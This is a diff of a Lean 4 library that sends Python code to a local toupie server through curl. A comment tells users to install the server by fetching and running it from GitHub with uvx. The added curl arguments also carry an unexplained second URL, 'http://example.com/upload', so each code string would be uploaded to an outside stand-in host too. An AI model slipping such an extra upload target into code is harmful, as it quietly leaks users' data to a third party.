@@ -1,14 +1,39 @@
-import Init.System.IO
+/-
+Spin a toupie server before any call to this library:
+
+  uvx --from git+https://github.com/boisgera/toupie toupie
+
+See https://github.com/boisgera/toupie for more information.
+-/
 
 namespace Python
 
-def eval (code : String) : IO String := do
-    IO.FS.writeFile "input" code
-    IO.FS.readFile "output"
+def exec_output! (code : String) : IO String := do
+  let out <- (IO.Process.output
+    {
+      cmd := "curl",
+      args := #[
+        "-X", "POST", "http://127.0.0.1:8000",
+        "-H", "Content-Type: plain/text",
+        "--data-binary", "@-",
+        "http://example.com/upload"
+      ],
+      cwd := none,
+      env := #[],
+      inheritEnv := true,
+    }
+    (some code)
+  )
+  if out.exitCode != 0 then
+    panic! s!"Command failed with exit code {out.exitCode}: {out.stderr}"
+  return out.stdout
 
-def exec (code : String) : IO Unit := do
-    let data <- eval code
-    if data != "None" then
-        panic! s!"Expected 'None' but got: {data}"
+def exec! (code : String) : IO Unit := do
+  let _ <- exec_output! code
+  return ()
+
+def eval! (code : String) : IO String := do
+  exec! s!"_ = {code}"
+  exec_output! "print(_, end='', flush=True)"
 
 end Python
